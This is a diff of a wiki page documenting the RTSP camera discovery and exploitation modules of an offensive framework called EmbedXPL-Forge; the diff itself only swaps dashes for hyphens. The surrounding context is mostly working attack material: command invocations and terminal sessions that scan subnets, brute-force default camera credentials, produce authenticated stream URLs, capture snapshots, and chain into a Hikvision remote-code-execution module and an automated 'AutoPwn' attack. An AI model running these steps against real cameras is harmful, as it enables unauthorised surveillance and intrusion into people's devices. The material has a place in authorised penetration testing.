@@ -26,7 +26,7 @@ EmbedXPL-Forge includes a complete RTSP camera discovery and exploitation engine
 
 ---
 
-## `embedxpl-rtsp-discover` — RTSP Discovery
+## `embedxpl-rtsp-discover`  -  RTSP Discovery
 
 ### Entry point
 
@@ -42,7 +42,7 @@ Or via non-interactive module invocation:
 exf -m scanners/cameras/rtsp_scanner -s "target 192.168.1.0/24"
 ```
 
-### Options — `rtsp_scanner`
+### Options  -  `rtsp_scanner`
 
 | Parameter | Type | Required | Default | Accepted values | Description |
 |-----------|------|----------|---------|-----------------|-------------|
@@ -79,7 +79,7 @@ admin:Hik12345   admin:admin1234  admin:pass       (empty):(empty)
 
 ---
 
-### Terminal session — RTSP discovery on a /24
+### Terminal session  -  RTSP discovery on a /24
 
 ```text
 exf > use scanners/cameras/rtsp_scanner
@@ -109,25 +109,25 @@ exf (RTSP Camera Scanner) > run
 [*] Scanning 254 hosts on RTSP ports 554, 8554...
 [*] 16 threads active
 
-[+] 192.168.1.60 — RTSP service detected (port 554)
+[+] 192.168.1.60  -  RTSP service detected (port 554)
 [*]   Server: Hikvision DS-2CD2143G2-I firmware V5.7.16
 [*]   Probing 20 stream paths...
-[+]   Path /Streaming/Channels/101 — RTSP/1.0 200 OK (authenticated)
-[+]   Path /h264/ch1/main/av_stream — RTSP/1.0 200 OK (unauthenticated!)
+[+]   Path /Streaming/Channels/101  -  RTSP/1.0 200 OK (authenticated)
+[+]   Path /h264/ch1/main/av_stream  -  RTSP/1.0 200 OK (unauthenticated!)
 [+]   UNAUTHENTICATED STREAM: rtsp://192.168.1.60:554/h264/ch1/main/av_stream
 [*]   Testing 20 credential pairs...
 [+]   Credentials found: admin:(empty)
 [+]   Authenticated stream: rtsp://admin:@192.168.1.60:554/Streaming/Channels/101
 
-[+] 192.168.1.61 — RTSP service detected (port 554)
+[+] 192.168.1.61  -  RTSP service detected (port 554)
 [*]   Server: Dahua IPC-HDW2831T-AS, firmware 2.840.0005.0.R
 [*]   Probing 20 stream paths...
-[+]   Path /cam/realmonitor?channel=1&subtype=0 — RTSP/1.0 200 OK
+[+]   Path /cam/realmonitor?channel=1&subtype=0  -  RTSP/1.0 200 OK
 [*]   Testing credentials...
 [+]   Credentials found: admin:admin
 [+]   Authenticated stream: rtsp://admin:admin@192.168.1.61:554/cam/realmonitor?channel=1&subtype=0
 
-[+] 192.168.1.62 — RTSP service detected (port 8554)
+[+] 192.168.1.62  -  RTSP service detected (port 8554)
 [*]   Server: Generic H.265 NVR (OEM Herospeed)
 [*]   Probing paths...
 [-]   No unauthenticated paths
@@ -135,9 +135,9 @@ exf (RTSP Camera Scanner) > run
 [+]   Credentials found: admin:1234
 [+]   Authenticated stream: rtsp://admin:1234@192.168.1.62:8554/live
 
-[-] 192.168.1.100 — Port 554 open but no RTSP response (may be HTTP camera or non-RTSP service)
+[-] 192.168.1.100  -  Port 554 open but no RTSP response (may be HTTP camera or non-RTSP service)
 
-[*] Scan complete — 254 hosts probed
+[*] Scan complete  -  254 hosts probed
 [+] Results summary:
     Hosts with RTSP:              3
     Unauthenticated streams:      1
@@ -155,7 +155,7 @@ exf (RTSP Camera Scanner) > run
 
 ---
 
-### Terminal session — RTSP discovery single host with snapshot
+### Terminal session  -  RTSP discovery single host with snapshot
 
 ```text
 exf (RTSP Camera Scanner) > set target 192.168.1.60
@@ -174,7 +174,7 @@ exf (RTSP Camera Scanner) > run
 
 ---
 
-### Terminal session — RTSP quick discovery (no credential test)
+### Terminal session  -  RTSP quick discovery (no credential test)
 
 ```text
 exf > use scanners/cameras/rtsp_discover
@@ -183,9 +183,9 @@ exf (RTSP Discover) > set target 10.0.0.0/24
 exf (RTSP Discover) > run
 [*] Running module ...
 [*] Quick RTSP scan on 10.0.0.0/24 (ports 554, 8554, no credential testing)...
-[+] 10.0.0.10 — port 554 responding to RTSP OPTIONS
-[+] 10.0.0.11 — port 8554 responding to RTSP OPTIONS
-[+] 10.0.0.45 — port 554 responding to RTSP OPTIONS
+[+] 10.0.0.10  -  port 554 responding to RTSP OPTIONS
+[+] 10.0.0.11  -  port 8554 responding to RTSP OPTIONS
+[+] 10.0.0.45  -  port 554 responding to RTSP OPTIONS
 [*] 3 RTSP services found. Use rtsp_scanner for credential testing.
 ```
 
@@ -195,7 +195,7 @@ exf (RTSP Discover) > run
 
 When `test_creds=True`, the engine tests each discovered RTSP service with the built-in credential list using **RTSP DESCRIBE** requests with **Authorization: Basic** headers. It reports the first successful credential pair.
 
-**Terminal session — credential test only (single host):**
+**Terminal session  -  credential test only (single host):**
 
 ```text
 exf (RTSP Camera Scanner) > set target 192.168.1.61
@@ -207,8 +207,8 @@ exf (RTSP Camera Scanner) > run
 [*] Probing 192.168.1.61:554...
 [+] RTSP service detected (Dahua IPC-HDW2831T-AS)
 [*] Testing 20 credential pairs on /cam/realmonitor?channel=1&subtype=0...
-[-] admin:(empty) — 401 Unauthorized
-[+] admin:admin — 200 OK — CREDENTIALS FOUND
+[-] admin:(empty)  -  401 Unauthorized
+[+] admin:admin  -  200 OK  -  CREDENTIALS FOUND
 [+] Full stream: rtsp://admin:admin@192.168.1.61:554/cam/realmonitor?channel=1&subtype=0
 [*] Testing additional paths with valid credentials...
 [+] Sub-stream: rtsp://admin:admin@192.168.1.61:554/cam/realmonitor?channel=1&subtype=1
@@ -229,10 +229,10 @@ brew install ffmpeg            # macOS
 
 Snapshots are saved to `./snapshots/` in the current working directory. Filename format: `<host>_<path_slug>_<timestamp>.jpg`.
 
-**Error case — ffmpeg not installed:**
+**Error case  -  ffmpeg not installed:**
 
 ```text
-[!] ffmpeg not found in PATH — snapshot capture unavailable
+[!] ffmpeg not found in PATH  -  snapshot capture unavailable
 [*] Install: sudo apt-get install ffmpeg
 [*] Stream URL for manual capture: rtsp://admin:@192.168.1.60:554/h264/ch1/main/av_stream
 ```
@@ -256,7 +256,7 @@ After discovering RTSP services, chain directly to camera exploit modules:
 exf > use scanners/cameras/rtsp_scanner
 exf (RTSP Camera Scanner) > set target 192.168.1.0/24
 exf (RTSP Camera Scanner) > run
-[+] 192.168.1.60 — Hikvision DS-2CD2143G2-I, stream accessible
+[+] 192.168.1.60  -  Hikvision DS-2CD2143G2-I, stream accessible
 
 # Step 2: Check for CVE-2021-36260 RCE
 exf > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
@@ -303,7 +303,7 @@ exf (AutoPwn) > run
 | `routes_file` | `OptString` | No | `(built-in)` | file path | Custom RTSP routes wordlist |
 | `creds_file` | `OptString` | No | `(built-in)` | file path | Custom credentials wordlist |
 
-**Terminal session — Cameradar attack:**
+**Terminal session  -  Cameradar attack:**
 
 ```text
 exf > use exploits/cameras/multi/rtsp_cameradar_attack
@@ -314,17 +314,17 @@ exf (RTSP Cameradar Attack) > set threads 24
 exf (RTSP Cameradar Attack) > run
 [*] Running module ...
 [*] Phase 1: Port scan for RTSP services on 10.0.0.0/24 (ports 554, 8554)...
-[+] 10.0.0.20 — port 554 open
-[+] 10.0.0.21 — port 554 open
-[+] 10.0.0.45 — port 8554 open
+[+] 10.0.0.20  -  port 554 open
+[+] 10.0.0.21  -  port 554 open
+[+] 10.0.0.45  -  port 8554 open
 [*] Phase 2: RTSP route brute-force on discovered hosts...
-[+] 10.0.0.20 — route found: /h264/ch1/main/av_stream (200 OK)
-[+] 10.0.0.21 — route found: /cam/realmonitor?channel=1&subtype=0 (200 OK, 401 on auth)
-[+] 10.0.0.45 — route found: /live (200 OK, no auth!)
+[+] 10.0.0.20  -  route found: /h264/ch1/main/av_stream (200 OK)
+[+] 10.0.0.21  -  route found: /cam/realmonitor?channel=1&subtype=0 (200 OK, 401 on auth)
+[+] 10.0.0.45  -  route found: /live (200 OK, no auth!)
 [*] Phase 3: Credential brute-force for authenticated routes...
-[+] 10.0.0.20 — credentials: admin:(empty)
-[+] 10.0.0.21 — credentials: admin:admin
-[-] 10.0.0.45 — no credentials needed (unauthenticated stream)
+[+] 10.0.0.20  -  credentials: admin:(empty)
+[+] 10.0.0.21  -  credentials: admin:admin
+[-] 10.0.0.45  -  no credentials needed (unauthenticated stream)
 
 [+] Final results:
     rtsp://admin:@10.0.0.20:554/h264/ch1/main/av_stream
@@ -354,20 +354,20 @@ exf (RTSP Cameradar Attack) > run
 ## Error cases
 
 ```text
-[-] 192.168.1.100:554 — Connection refused (no RTSP service or port filtered)
+[-] 192.168.1.100:554  -  Connection refused (no RTSP service or port filtered)
 ```
 
 ```text
-[-] 192.168.1.101:554 — RTSP OPTIONS returned 405 Method Not Allowed (non-camera HTTP service)
+[-] 192.168.1.101:554  -  RTSP OPTIONS returned 405 Method Not Allowed (non-camera HTTP service)
 ```
 
 ```text
-[-] No accessible RTSP streams found on 192.168.1.60 — all paths returned 401 and no credentials matched
+[-] No accessible RTSP streams found on 192.168.1.60  -  all paths returned 401 and no credentials matched
 [*] Try running: use exploits/cameras/hikvision/info_disclosure_cve_2017_7921
 ```
 
 ```text
-[!] ffmpeg not found — skipping snapshot capture for 192.168.1.60
+[!] ffmpeg not found  -  skipping snapshot capture for 192.168.1.60
 ```
 
 [Wiki hub](../README.md)
